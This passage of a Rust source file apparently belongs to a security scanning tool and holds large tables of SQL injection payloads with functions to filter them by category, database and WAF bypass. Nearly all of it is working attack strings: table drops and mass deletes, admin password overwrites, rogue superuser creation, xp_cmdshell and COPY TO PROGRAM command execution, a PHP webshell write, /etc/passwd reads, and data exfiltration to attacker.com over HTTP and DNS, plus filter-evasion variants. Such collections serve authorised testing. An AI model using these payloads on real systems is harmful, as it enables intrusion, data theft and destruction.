// Time-based blind payloads
// ---------------------------------------------------------------------------
const TIME_BLIND_PAYLOADS: &[SqliPayload] = &[
    SqliPayload {
        payload: "' AND SLEEP(5)--",
        category: SqliCategory::TimeBlind,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::None,
        description: "MySQL SLEEP 5 seconds",
    },
    SqliPayload {
        payload: "' AND IF(1=1,SLEEP(5),0)--",
        category: SqliCategory::TimeBlind,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::None,
        description: "MySQL conditional SLEEP",
    },
    SqliPayload {
        payload: "' AND (SELECT SLEEP(5) FROM dual WHERE 1=1)--",
        category: SqliCategory::TimeBlind,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::None,
        description: "MySQL subquery SLEEP",
    },
    SqliPayload {
        payload: "' AND BENCHMARK(10000000,SHA1('test'))--",
        category: SqliCategory::TimeBlind,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::None,
        description: "MySQL BENCHMARK delay",
    },
    SqliPayload {
        payload: "' AND IF(ASCII(SUBSTRING(database(),1,1))>64,SLEEP(5),0)--",
        category: SqliCategory::TimeBlind,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::None,
        description: "MySQL conditional data extraction",
    },
    SqliPayload {
        payload: "'; SELECT pg_sleep(5)--",
        category: SqliCategory::TimeBlind,
        dbms: SqliDbms::PostgreSQL,
        waf_bypass: SqliWafBypass::None,
        description: "PostgreSQL pg_sleep",
    },
    SqliPayload {
        payload: "' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--",
        category: SqliCategory::TimeBlind,
        dbms: SqliDbms::PostgreSQL,
        waf_bypass: SqliWafBypass::None,
        description: "PostgreSQL conditional pg_sleep",
    },
    SqliPayload {
        payload: "' AND 1=(SELECT 1 FROM pg_sleep(5))--",
        category: SqliCategory::TimeBlind,
        dbms: SqliDbms::PostgreSQL,
        waf_bypass: SqliWafBypass::None,
        description: "PostgreSQL subquery sleep",
    },
    SqliPayload {
        payload: "'; WAITFOR DELAY '0:0:5'--",
        category: SqliCategory::TimeBlind,
        dbms: SqliDbms::Mssql,
        waf_bypass: SqliWafBypass::None,
        description: "MSSQL WAITFOR DELAY",
    },
    SqliPayload {
        payload: "' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 1/0 END)=1 WAITFOR DELAY '0:0:5'--",
        category: SqliCategory::TimeBlind,
        dbms: SqliDbms::Mssql,
        waf_bypass: SqliWafBypass::None,
        description: "MSSQL conditional WAITFOR",
    },
    SqliPayload {
        payload: "' IF(1=1) WAITFOR DELAY '0:0:5'--",
        category: SqliCategory::TimeBlind,
        dbms: SqliDbms::Mssql,
        waf_bypass: SqliWafBypass::None,
        description: "MSSQL IF WAITFOR",
    },
    SqliPayload {
        payload: "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
        category: SqliCategory::TimeBlind,
        dbms: SqliDbms::Oracle,
        waf_bypass: SqliWafBypass::None,
        description: "Oracle DBMS_PIPE delay",
    },
    SqliPayload {
        payload: "' AND (SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 0 END FROM dual)--",
        category: SqliCategory::TimeBlind,
        dbms: SqliDbms::Oracle,
        waf_bypass: SqliWafBypass::None,
        description: "Oracle conditional delay",
    },
    SqliPayload {
        payload: "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--",
        category: SqliCategory::TimeBlind,
        dbms: SqliDbms::SQLite,
        waf_bypass: SqliWafBypass::None,
        description: "SQLite heavy computation delay",
    },
    SqliPayload {
        payload: "' AND (SELECT CASE WHEN (1=1) THEN RANDOMBLOB(500000000) ELSE 0 END)--",
        category: SqliCategory::TimeBlind,
        dbms: SqliDbms::SQLite,
        waf_bypass: SqliWafBypass::None,
        description: "SQLite conditional heavy query",
    },
    // WAF bypass time
    SqliPayload {
        payload: "' AND /*!SLEEP*/(5)--",
        category: SqliCategory::TimeBlind,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::InlineComment,
        description: "MySQL inline comment SLEEP bypass",
    },
    SqliPayload {
        payload: "' AND SLEEP/**/(5)--",
        category: SqliCategory::TimeBlind,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::CommentInsertion,
        description: "Comment-separated SLEEP",
    },
    SqliPayload {
        payload: "' AND SLeEp(5)--",
        category: SqliCategory::TimeBlind,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::CaseVariation,
        description: "Mixed case SLEEP",
    },
    SqliPayload {
        payload: "' AND (SELECT * FROM (SELECT SLEEP(5))a)--",
        category: SqliCategory::TimeBlind,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::None,
        description: "MySQL nested subquery SLEEP",
    },
    SqliPayload {
        payload: "' AND (SELECT CASE WHEN (ASCII(SUBSTRING(current_user,1,1))>64) THEN pg_sleep(5) ELSE pg_sleep(0) END)--",
        category: SqliCategory::TimeBlind,
        dbms: SqliDbms::PostgreSQL,
        waf_bypass: SqliWafBypass::None,
        description: "PostgreSQL conditional user extraction",
    },
    SqliPayload {
        payload: "' AND (SELECT GENERATE_SERIES(1,10000000))>0--",
        category: SqliCategory::TimeBlind,
        dbms: SqliDbms::PostgreSQL,
        waf_bypass: SqliWafBypass::None,
        description: "PostgreSQL heavy computation delay",
    },
    SqliPayload {
        payload: "'; IF (SELECT LEN(DB_NAME()))>3 WAITFOR DELAY '0:0:5'--",
        category: SqliCategory::TimeBlind,
        dbms: SqliDbms::Mssql,
        waf_bypass: SqliWafBypass::None,
        description: "MSSQL conditional DB name length",
    },
    SqliPayload {
        payload: "' AND (SELECT COUNT(*) FROM generate_series(1,10000000))>0--",
        category: SqliCategory::TimeBlind,
        dbms: SqliDbms::PostgreSQL,
        waf_bypass: SqliWafBypass::None,
        description: "PostgreSQL generate_series delay",
    },
    SqliPayload {
        payload: "' AND (SELECT CASE WHEN (UNICODE(SUBSTRING((SELECT TOP 1 name FROM sysobjects),1,1))>64) THEN WAITFOR DELAY '0:0:5' ELSE 0 END)--",
        category: SqliCategory::TimeBlind,
        dbms: SqliDbms::Mssql,
        waf_bypass: SqliWafBypass::None,
        description: "MSSQL conditional table name extraction",
    },
];

// ---------------------------------------------------------------------------
// Stacked query payloads
// ---------------------------------------------------------------------------
const STACKED_QUERY_PAYLOADS: &[SqliPayload] = &[
    SqliPayload {
        payload: "'; DROP TABLE users--",
        category: SqliCategory::StackedQuery,
        dbms: SqliDbms::Generic,
        waf_bypass: SqliWafBypass::None,
        description: "Classic DROP TABLE",
    },
    SqliPayload {
        payload: "'; INSERT INTO users(username,password) VALUES('hacker','hacked')--",
        category: SqliCategory::StackedQuery,
        dbms: SqliDbms::Generic,
        waf_bypass: SqliWafBypass::None,
        description: "Insert malicious user",
    },
    SqliPayload {
        payload: "'; UPDATE users SET password='hacked' WHERE username='admin'--",
        category: SqliCategory::StackedQuery,
        dbms: SqliDbms::Generic,
        waf_bypass: SqliWafBypass::None,
        description: "Update admin password",
    },
    SqliPayload {
        payload: "'; CREATE TABLE test(cmd TEXT)--",
        category: SqliCategory::StackedQuery,
        dbms: SqliDbms::Generic,
        waf_bypass: SqliWafBypass::None,
        description: "Create exfil table",
    },
    SqliPayload {
        payload: "'; EXEC xp_cmdshell('whoami')--",
        category: SqliCategory::StackedQuery,
        dbms: SqliDbms::Mssql,
        waf_bypass: SqliWafBypass::None,
        description: "MSSQL xp_cmdshell",
    },
    SqliPayload {
        payload: "'; EXEC sp_configure 'show advanced options',1; RECONFIGURE--",
        category: SqliCategory::StackedQuery,
        dbms: SqliDbms::Mssql,
        waf_bypass: SqliWafBypass::None,
        description: "MSSQL enable advanced options",
    },
    SqliPayload {
        payload: "'; EXEC master..xp_dirtree '\\\\attacker.com\\share'--",
        category: SqliCategory::StackedQuery,
        dbms: SqliDbms::Mssql,
        waf_bypass: SqliWafBypass::None,
        description: "MSSQL UNC path for hash theft",
    },
    SqliPayload {
        payload: "'; SELECT INTO OUTFILE '/var/www/html/shell.php' FROM (SELECT '<?php system($_GET[\"c\"]); ?>')x--",
        category: SqliCategory::StackedQuery,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::None,
        description: "MySQL webshell write",
    },
    SqliPayload {
        payload: "'; COPY (SELECT '') TO PROGRAM 'id'--",
        category: SqliCategory::StackedQuery,
        dbms: SqliDbms::PostgreSQL,
        waf_bypass: SqliWafBypass::None,
        description: "PostgreSQL COPY command exec",
    },
    SqliPayload {
        payload: "'; CREATE EXTENSION IF NOT EXISTS dblink--",
        category: SqliCategory::StackedQuery,
        dbms: SqliDbms::PostgreSQL,
        waf_bypass: SqliWafBypass::None,
        description: "PostgreSQL create dblink extension",
    },
    SqliPayload {
        payload: "'; ATTACH DATABASE '/tmp/test.db' AS test--",
        category: SqliCategory::StackedQuery,
        dbms: SqliDbms::SQLite,
        waf_bypass: SqliWafBypass::None,
        description: "SQLite ATTACH database",
    },
    SqliPayload {
        payload: "'; DELETE FROM users--",
        category: SqliCategory::StackedQuery,
        dbms: SqliDbms::Generic,
        waf_bypass: SqliWafBypass::None,
        description: "Delete all users",
    },
    SqliPayload {
        payload: "'; ALTER TABLE users ADD COLUMN backdoor TEXT DEFAULT 'pwned'--",
        category: SqliCategory::StackedQuery,
        dbms: SqliDbms::Generic,
        waf_bypass: SqliWafBypass::None,
        description: "Add backdoor column",
    },
    SqliPayload {
        payload: "'; GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%' IDENTIFIED BY 'pass'--",
        category: SqliCategory::StackedQuery,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::None,
        description: "MySQL grant all to attacker",
    },
    SqliPayload {
        payload: "'; CREATE USER hacker WITH PASSWORD 'pass' SUPERUSER--",
        category: SqliCategory::StackedQuery,
        dbms: SqliDbms::PostgreSQL,
        waf_bypass: SqliWafBypass::None,
        description: "PostgreSQL create superuser",
    },
    SqliPayload {
        payload: "'; EXEC sp_addrolemember 'sysadmin','hacker'--",
        category: SqliCategory::StackedQuery,
        dbms: SqliDbms::Mssql,
        waf_bypass: SqliWafBypass::None,
        description: "MSSQL add sysadmin role",
    },
    SqliPayload {
        payload: "'; SELECT lo_import('/etc/passwd')--",
        category: SqliCategory::StackedQuery,
        dbms: SqliDbms::PostgreSQL,
        waf_bypass: SqliWafBypass::None,
        description: "PostgreSQL large object import",
    },
    SqliPayload {
        payload: "'; ALTER ROLE current_user CREATEDB--",
        category: SqliCategory::StackedQuery,
        dbms: SqliDbms::PostgreSQL,
        waf_bypass: SqliWafBypass::None,
        description: "PostgreSQL escalate to CREATEDB",
    },
    SqliPayload {
        payload: "'; SELECT pg_ls_dir('/')--",
        category: SqliCategory::StackedQuery,
        dbms: SqliDbms::PostgreSQL,
        waf_bypass: SqliWafBypass::None,
        description: "PostgreSQL directory listing",
    },
    SqliPayload {
        payload: "'; EXEC xp_regread 'HKLM','Software\\Microsoft\\MSSQLServer','BackupDirectory'--",
        category: SqliCategory::StackedQuery,
        dbms: SqliDbms::Mssql,
        waf_bypass: SqliWafBypass::None,
        description: "MSSQL registry read",
    },
    SqliPayload {
        payload: "'; CREATE OR REPLACE FUNCTION cmd(TEXT) RETURNS TEXT AS 'DECLARE r TEXT;BEGIN EXECUTE $1 INTO r;RETURN r;END;' LANGUAGE plpgsql--",
        category: SqliCategory::StackedQuery,
        dbms: SqliDbms::PostgreSQL,
        waf_bypass: SqliWafBypass::None,
        description: "PostgreSQL create cmd function",
    },
    SqliPayload {
        payload: "'; UPDATE sqlite_master SET sql=replace(sql,'CREATE TABLE','CREATE TABLE IF NOT EXISTS')--",
        category: SqliCategory::StackedQuery,
        dbms: SqliDbms::SQLite,
        waf_bypass: SqliWafBypass::None,
        description: "SQLite schema modification",
    },
];

// ---------------------------------------------------------------------------
// Out-of-band payloads (DNS/HTTP exfil)
// ---------------------------------------------------------------------------
const OOB_PAYLOADS: &[SqliPayload] = &[
    SqliPayload {
        payload: "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',version(),'.attacker.com\\\\a'))--",
        category: SqliCategory::OutOfBand,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::None,
        description: "MySQL DNS exfil via LOAD_FILE",
    },
    SqliPayload {
        payload: "' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT database()),'.attacker.com\\\\a')))--",
        category: SqliCategory::OutOfBand,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::None,
        description: "MySQL DNS exfil database name",
    },
    SqliPayload {
        payload: "'; SELECT dblink_send_query('host=attacker.com dbname=x','SELECT version()')--",
        category: SqliCategory::OutOfBand,
        dbms: SqliDbms::PostgreSQL,
        waf_bypass: SqliWafBypass::None,
        description: "PostgreSQL dblink OOB",
    },
    SqliPayload {
        payload: "'; COPY (SELECT version()) TO PROGRAM 'curl http://attacker.com/'--",
        category: SqliCategory::OutOfBand,
        dbms: SqliDbms::PostgreSQL,
        waf_bypass: SqliWafBypass::None,
        description: "PostgreSQL COPY curl OOB",
    },
    SqliPayload {
        payload: "'; EXEC master..xp_dirtree '\\\\attacker.com\\a'--",
        category: SqliCategory::OutOfBand,
        dbms: SqliDbms::Mssql,
        waf_bypass: SqliWafBypass::None,
        description: "MSSQL xp_dirtree DNS OOB",
    },
    SqliPayload {
        payload: "'; DECLARE @q VARCHAR(1024); SET @q='\\\\'+@@version+'.attacker.com\\a'; EXEC master..xp_dirtree @q--",
        category: SqliCategory::OutOfBand,
        dbms: SqliDbms::Mssql,
        waf_bypass: SqliWafBypass::None,
        description: "MSSQL version DNS exfil",
    },
    SqliPayload {
        payload: "'; EXEC master..xp_fileexist '\\\\attacker.com\\a'--",
        category: SqliCategory::OutOfBand,
        dbms: SqliDbms::Mssql,
        waf_bypass: SqliWafBypass::None,
        description: "MSSQL xp_fileexist DNS OOB",
    },
    SqliPayload {
        payload: "' AND UTL_HTTP.request('http://attacker.com/'||(SELECT banner FROM v$version WHERE ROWNUM=1)) IS NOT NULL--",
        category: SqliCategory::OutOfBand,
        dbms: SqliDbms::Oracle,
        waf_bypass: SqliWafBypass::None,
        description: "Oracle UTL_HTTP OOB",
    },
    SqliPayload {
        payload: "' AND UTL_INADDR.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1)||'.attacker.com') IS NOT NULL--",
        category: SqliCategory::OutOfBand,
        dbms: SqliDbms::Oracle,
        waf_bypass: SqliWafBypass::None,
        description: "Oracle UTL_INADDR DNS OOB",
    },
    SqliPayload {
        payload: "' AND HTTPURITYPE('http://attacker.com/'||(SELECT banner FROM v$version WHERE ROWNUM=1)).GETCLOB() IS NOT NULL--",
        category: SqliCategory::OutOfBand,
        dbms: SqliDbms::Oracle,
        waf_bypass: SqliWafBypass::None,
        description: "Oracle HTTPURITYPE OOB",
    },
    SqliPayload {
        payload: "' AND DBMS_LDAP.INIT((SELECT banner FROM v$version WHERE ROWNUM=1)||'.attacker.com',80) IS NOT NULL--",
        category: SqliCategory::OutOfBand,
        dbms: SqliDbms::Oracle,
        waf_bypass: SqliWafBypass::None,
        description: "Oracle DBMS_LDAP DNS OOB",
    },
    SqliPayload {
        payload: "'; SELECT xmlelement(name x,pg_read_file('/etc/passwd')) FROM pg_class--",
        category: SqliCategory::OutOfBand,
        dbms: SqliDbms::PostgreSQL,
        waf_bypass: SqliWafBypass::None,
        description: "PostgreSQL XML file read OOB",
    },
];

// ---------------------------------------------------------------------------
// Second-order payloads
// ---------------------------------------------------------------------------
const SECOND_ORDER_PAYLOADS: &[SqliPayload] = &[
    SqliPayload {
        payload: "admin'--",
        category: SqliCategory::SecondOrder,
        dbms: SqliDbms::Generic,
        waf_bypass: SqliWafBypass::None,
        description: "Username stored for later query",
    },
    SqliPayload {
        payload: "' OR 1=1--",
        category: SqliCategory::SecondOrder,
        dbms: SqliDbms::Generic,
        waf_bypass: SqliWafBypass::None,
        description: "Boolean injection in stored value",
    },
    SqliPayload {
        payload: "admin' AND 1=CONVERT(int,(SELECT @@version))--",
        category: SqliCategory::SecondOrder,
        dbms: SqliDbms::Mssql,
        waf_bypass: SqliWafBypass::None,
        description: "MSSQL second-order error-based",
    },
    SqliPayload {
        payload: "admin' UNION SELECT password FROM users WHERE username='admin'--",
        category: SqliCategory::SecondOrder,
        dbms: SqliDbms::Generic,
        waf_bypass: SqliWafBypass::None,
        description: "UNION in stored username",
    },
    SqliPayload {
        payload: "test'); INSERT INTO admins(username) VALUES('hacker')--",
        category: SqliCategory::SecondOrder,
        dbms: SqliDbms::Generic,
        waf_bypass: SqliWafBypass::None,
        description: "Stacked insert via stored value",
    },
    SqliPayload {
        payload: "test' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 1)))--",
        category: SqliCategory::SecondOrder,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::None,
        description: "MySQL second-order EXTRACTVALUE",
    },
    SqliPayload {
        payload: "user@test.com' AND 1=1--",
        category: SqliCategory::SecondOrder,
        dbms: SqliDbms::Generic,
        waf_bypass: SqliWafBypass::None,
        description: "Email field second-order probe",
    },
    SqliPayload {
        payload: "${7*7}",
        category: SqliCategory::SecondOrder,
        dbms: SqliDbms::Generic,
        waf_bypass: SqliWafBypass::None,
        description: "Template expression in stored value",
    },
    SqliPayload {
        payload: "admin' AND (SELECT SLEEP(5))--",
        category: SqliCategory::SecondOrder,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::None,
        description: "MySQL second-order time blind",
    },
    SqliPayload {
        payload: "test'); DROP TABLE users--",
        category: SqliCategory::SecondOrder,
        dbms: SqliDbms::Generic,
        waf_bypass: SqliWafBypass::None,
        description: "Destructive second-order stacked",
    },
    SqliPayload {
        payload: "admin'/*",
        category: SqliCategory::SecondOrder,
        dbms: SqliDbms::Generic,
        waf_bypass: SqliWafBypass::CommentInsertion,
        description: "Block comment open for multi-line",
    },
    SqliPayload {
        payload: "test\\",
        category: SqliCategory::SecondOrder,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::None,
        description: "Backslash escape for next query",
    },
    SqliPayload {
        payload: "admin' AND UPDATEXML(1,CONCAT(0x7e,user()),1)--",
        category: SqliCategory::SecondOrder,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::None,
        description: "MySQL second-order UPDATEXML",
    },
    // Additional WAF bypass generic
    SqliPayload {
        payload: "' /*!50000AND*/ 1=1--",
        category: SqliCategory::SecondOrder,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::InlineComment,
        description: "Versioned comment AND in stored value",
    },
    SqliPayload {
        payload: "' AND 0x313d31--",
        category: SqliCategory::SecondOrder,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::HexEncoding,
        description: "Hex-encoded condition in stored value",
    },
    SqliPayload {
        payload: "test' AND pg_sleep(5)--",
        category: SqliCategory::SecondOrder,
        dbms: SqliDbms::PostgreSQL,
        waf_bypass: SqliWafBypass::None,
        description: "PostgreSQL second-order time blind",
    },
    SqliPayload {
        payload: "admin'; EXEC xp_cmdshell('whoami')--",
        category: SqliCategory::SecondOrder,
        dbms: SqliDbms::Mssql,
        waf_bypass: SqliWafBypass::None,
        description: "MSSQL second-order command exec",
    },
    SqliPayload {
        payload: "admin' UNION SELECT NULL,NULL,NULL--",
        category: SqliCategory::SecondOrder,
        dbms: SqliDbms::Generic,
        waf_bypass: SqliWafBypass::None,
        description: "Column count probe in stored value",
    },
    SqliPayload {
        payload: "admin%00'--",
        category: SqliCategory::SecondOrder,
        dbms: SqliDbms::Generic,
        waf_bypass: SqliWafBypass::NullByte,
        description: "Null byte truncation in stored value",
    },
    SqliPayload {
        payload: "test'||(SELECT version())||'",
        category: SqliCategory::SecondOrder,
        dbms: SqliDbms::PostgreSQL,
        waf_bypass: SqliWafBypass::StringConcatenation,
        description: "PostgreSQL concat injection stored",
    },
];

// ---------------------------------------------------------------------------
// Additional WAF bypass payloads (fills to 200+)
// ---------------------------------------------------------------------------
const WAF_BYPASS_PAYLOADS: &[SqliPayload] = &[
    SqliPayload {
        payload: "' OR 1<2--",
        category: SqliCategory::BooleanBlind,
        dbms: SqliDbms::Generic,
        waf_bypass: SqliWafBypass::WhitespaceAlternative,
        description: "Less-than instead of equals",
    },
    SqliPayload {
        payload: "' OR 1 BETWEEN 0 AND 2--",
        category: SqliCategory::BooleanBlind,
        dbms: SqliDbms::Generic,
        waf_bypass: SqliWafBypass::WhitespaceAlternative,
        description: "BETWEEN instead of equals",
    },
    SqliPayload {
        payload: "' OR 1 IN(1)--",
        category: SqliCategory::BooleanBlind,
        dbms: SqliDbms::Generic,
        waf_bypass: SqliWafBypass::WhitespaceAlternative,
        description: "IN clause instead of equals",
    },
    SqliPayload {
        payload: "' /*!50000OR*/ 1=1--",
        category: SqliCategory::BooleanBlind,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::InlineComment,
        description: "MySQL versioned comment OR bypass",
    },
    SqliPayload {
        payload: "'%20OR%201=1--",
        category: SqliCategory::BooleanBlind,
        dbms: SqliDbms::Generic,
        waf_bypass: SqliWafBypass::EncodingBypass,
        description: "URL-encoded space OR bypass",
    },
    SqliPayload {
        payload: "' OR 1=1#",
        category: SqliCategory::BooleanBlind,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::None,
        description: "Hash comment instead of double dash",
    },
    SqliPayload {
        payload: "'-IF(1=1,1,0)='1",
        category: SqliCategory::BooleanBlind,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::WhitespaceAlternative,
        description: "IF-based without AND/OR keyword",
    },
    SqliPayload {
        payload: "' DIV 0--",
        category: SqliCategory::ErrorBased,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::WhitespaceAlternative,
        description: "MySQL DIV zero error",
    },
    SqliPayload {
        payload: "' MOD 0--",
        category: SqliCategory::ErrorBased,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::WhitespaceAlternative,
        description: "MySQL MOD zero error",
    },
    SqliPayload {
        payload: "1e309",
        category: SqliCategory::ErrorBased,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::ScientificNotation,
        description: "Scientific notation overflow",
    },
    SqliPayload {
        payload: "' UNION SELECT * FROM((SELECT 1)a JOIN(SELECT 2)b JOIN(SELECT 3)c)--",
        category: SqliCategory::UnionBased,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::WhitespaceAlternative,
        description: "JOIN-based column alignment",
    },
    SqliPayload {
        payload: "' OR JSON_EXTRACT('{\"a\":1}','$.a')=1--",
        category: SqliCategory::BooleanBlind,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::JsonOperator,
        description: "MySQL JSON operator bypass",
    },
    SqliPayload {
        payload: "' OR '{\"a\":1}'::jsonb->>'a'='1'--",
        category: SqliCategory::BooleanBlind,
        dbms: SqliDbms::PostgreSQL,
        waf_bypass: SqliWafBypass::JsonOperator,
        description: "PostgreSQL JSON operator bypass",
    },
    SqliPayload {
        payload: "0' XOR 1--",
        category: SqliCategory::BooleanBlind,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::WhitespaceAlternative,
        description: "XOR instead of OR",
    },
    SqliPayload {
        payload: "' && 1=1--",
        category: SqliCategory::BooleanBlind,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::WhitespaceAlternative,
        description: "Double ampersand AND bypass",
    },
    SqliPayload {
        payload: "' || 1=1--",
        category: SqliCategory::BooleanBlind,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::WhitespaceAlternative,
        description: "Double pipe OR bypass",
    },
    SqliPayload {
        payload: "'=(''=')or'",
        category: SqliCategory::BooleanBlind,
        dbms: SqliDbms::Generic,
        waf_bypass: SqliWafBypass::WhitespaceAlternative,
        description: "String-equals chained OR",
    },
    SqliPayload {
        payload: "1' ORDER BY 1--+",
        category: SqliCategory::UnionBased,
        dbms: SqliDbms::Generic,
        waf_bypass: SqliWafBypass::None,
        description: "ORDER BY column count probe",
    },
    SqliPayload {
        payload: "1' ORDER BY 10--+",
        category: SqliCategory::UnionBased,
        dbms: SqliDbms::Generic,
        waf_bypass: SqliWafBypass::None,
        description: "ORDER BY high column probe",
    },
    SqliPayload {
        payload: "' HAVING 1=1 ORDER BY 1--",
        category: SqliCategory::ErrorBased,
        dbms: SqliDbms::Generic,
        waf_bypass: SqliWafBypass::None,
        description: "HAVING with ORDER BY leak",
    },
    SqliPayload {
        payload: "'; DECLARE @x VARCHAR(99);SET @x='\\\\'+DB_NAME()+'.attacker.com\\a';EXEC('xp_dirtree \"'+@x+'\"')--",
        category: SqliCategory::OutOfBand,
        dbms: SqliDbms::Mssql,
        waf_bypass: SqliWafBypass::StringConcatenation,
        description: "MSSQL dynamic xp_dirtree OOB",
    },
    SqliPayload {
        payload: "' AND (SELECT 1 WHERE 1=1 UNION SELECT 2 WHERE 1=0)=1--",
        category: SqliCategory::BooleanBlind,
        dbms: SqliDbms::Generic,
        waf_bypass: SqliWafBypass::None,
        description: "UNION-based boolean subquery",
    },
    SqliPayload {
        payload: "'+OR+1=1--",
        category: SqliCategory::BooleanBlind,
        dbms: SqliDbms::Generic,
        waf_bypass: SqliWafBypass::EncodingBypass,
        description: "Plus-encoded spaces",
    },
    SqliPayload {
        payload: "'/**/OR/**/1=1--",
        category: SqliCategory::BooleanBlind,
        dbms: SqliDbms::Generic,
        waf_bypass: SqliWafBypass::CommentInsertion,
        description: "Full comment-separated OR",
    },
    SqliPayload {
        payload: "' UNION%23%0ASELECT NULL--",
        category: SqliCategory::UnionBased,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::EncodingBypass,
        description: "Hash newline UNION bypass",
    },
    SqliPayload {
        payload: "' /*!12345UNION SELECT*/ NULL--",
        category: SqliCategory::UnionBased,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::InlineComment,
        description: "MySQL versioned merged comment bypass",
    },
    SqliPayload {
        payload: "' UNION ALL SELECT NULL--",
        category: SqliCategory::UnionBased,
        dbms: SqliDbms::Generic,
        waf_bypass: SqliWafBypass::None,
        description: "UNION ALL variant",
    },
    SqliPayload {
        payload: "' OR ISNULL(1/0)--",
        category: SqliCategory::BooleanBlind,
        dbms: SqliDbms::Mssql,
        waf_bypass: SqliWafBypass::WhitespaceAlternative,
        description: "MSSQL ISNULL bypass",
    },
    SqliPayload {
        payload: "' OR IIF(1=1,1,0)=1--",
        category: SqliCategory::BooleanBlind,
        dbms: SqliDbms::Mssql,
        waf_bypass: SqliWafBypass::WhitespaceAlternative,
        description: "MSSQL IIF function bypass",
    },
    SqliPayload {
        payload: "' UNION SELECT CHR(65)||CHR(66) FROM dual--",
        category: SqliCategory::UnionBased,
        dbms: SqliDbms::Oracle,
        waf_bypass: SqliWafBypass::StringConcatenation,
        description: "Oracle CHR concat bypass",
    },
];

/// Returns all SQLi payloads.
pub fn all_sqli_payloads() -> Vec<&'static SqliPayload> {
    let mut all = Vec::with_capacity(
        UNION_PAYLOADS.len()
            + ERROR_PAYLOADS.len()
            + BOOLEAN_BLIND_PAYLOADS.len()
            + TIME_BLIND_PAYLOADS.len()
            + STACKED_QUERY_PAYLOADS.len()
            + OOB_PAYLOADS.len()
            + SECOND_ORDER_PAYLOADS.len()
            + WAF_BYPASS_PAYLOADS.len(),
    );
    all.extend(UNION_PAYLOADS.iter());
    all.extend(ERROR_PAYLOADS.iter());
    all.extend(BOOLEAN_BLIND_PAYLOADS.iter());
    all.extend(TIME_BLIND_PAYLOADS.iter());
    all.extend(STACKED_QUERY_PAYLOADS.iter());
    all.extend(OOB_PAYLOADS.iter());
    all.extend(SECOND_ORDER_PAYLOADS.iter());
    all.extend(WAF_BYPASS_PAYLOADS.iter());
    all
}

/// Filter payloads by SQLi category.
pub fn sqli_payloads_by_category(category: SqliCategory) -> Vec<&'static SqliPayload> {
    all_sqli_payloads()
        .into_iter()
        .filter(|p| p.category == category)
        .collect()
}

/// Filter payloads by target DBMS.
pub fn sqli_payloads_by_dbms(dbms: SqliDbms) -> Vec<&'static SqliPayload> {
    all_sqli_payloads()
        .into_iter()
        .filter(|p| p.dbms == dbms)
        .collect()
}

/// Return payloads that employ WAF bypass techniques.
pub fn sqli_waf_bypass_payloads() -> Vec<&'static SqliPayload> {
    all_sqli_payloads()
        .into_iter()
        .filter(|p| p.waf_bypass != SqliWafBypass::None)
        .collect()
}

/// Total count of all SQLi payloads.
pub fn sqli_payload_count() -> usize {
    UNION_PAYLOADS.len()
        + ERROR_PAYLOADS.len()
        + BOOLEAN_BLIND_PAYLOADS.len()
        + TIME_BLIND_PAYLOADS.len()
        + STACKED_QUERY_PAYLOADS.len()
        + OOB_PAYLOADS.len()
        + SECOND_ORDER_PAYLOADS.len()
        + WAF_BYPASS_PAYLOADS.len()
}
